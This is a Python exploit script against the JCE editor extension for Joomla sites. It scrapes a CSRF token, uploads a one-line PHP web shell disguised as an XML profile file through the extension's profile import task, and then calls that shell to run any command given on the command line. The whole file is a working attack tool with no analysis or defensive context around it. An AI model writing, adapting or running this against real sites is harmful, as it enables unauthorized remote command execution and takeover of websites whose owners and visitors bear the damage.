import requests
import argparse
import re
from urllib.parse import urljoin
import urllib3

urllib3.disable_warnings()

class JCEExploit:
    def __init__(self, target_url, proxy=None):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        self.filename = f"jce-{__import__('random').randint(1000,9999)}.xml.php"
        self.payload = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'

    def get_csrf_token(self):
        try:
            resp = self.session.get(self.target + '/', timeout=10)
            if resp.status_code != 200:
                print(f"Failed to reach target: {resp.status_code}")
                return None

            patterns = [
                r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"',
                r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
                r'<meta[^>]*name="csrf\.token"[^>]*content="([a-f0-9]{32})"',
                r'name="([a-f0-9]{32})"\s+value="1"',
            ]

            for pattern in patterns:
                match = re.search(pattern, resp.text, re.I)
                if match:
                    token = match.group(1)
                    print(f"CSRF token: {token}")
                    return token

            print("Could not find CSRF token")
            return None
        except Exception as e:
            print(f"Request error: {e}")
            return None

    def upload_profile(self, token):
        if not token:
            return False

        endpoint = urljoin(self.target, '/index.php?option=com_jce')

        files = {'profile_file': (self.filename, self.payload, 'application/xml')}
        data = {'task': 'profiles.import', token: '1'}

        try:
            print(f"Uploading {self.filename}")
            resp = self.session.post(endpoint, files=files, data=data, timeout=15)

            if resp.status_code == 200 and ('success' in resp.text.lower() or 'true' in resp.text.lower()):
                print("Upload successful")
                return True
            else:
                print(f"Upload failed (status {resp.status_code})")
                return False
        except Exception as e:
            print(f"Upload error: {e}")
            return False

    def execute_command(self, command):
        url = urljoin(self.target, f'/tmp/{self.filename}')
        try:
            resp = self.session.get(url, params={'cmd': command}, timeout=10)
            if resp.status_code == 200:
                return resp.text
            else:
                return f"HTTP {resp.status_code}"
        except Exception as e:
            return f"Request error: {e}"

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help="Target Joomla URL")
    parser.add_argument('--proxy', help="HTTP proxy")
    parser.add_argument('-c', '--cmd', required=True, help="Command to execute")
    
    args = parser.parse_args()

    exploit = JCEExploit(args.url, args.proxy)
    
    token = exploit.get_csrf_token()
    if not token:
        print("Failed to get CSRF token")
        return

    if not exploit.upload_profile(token):
        print("Upload failed")
        return

    print(f"Executing: {args.cmd}")
    output = exploit.execute_command(args.cmd)
    print(output)

if __name__ == "__main__":
    main()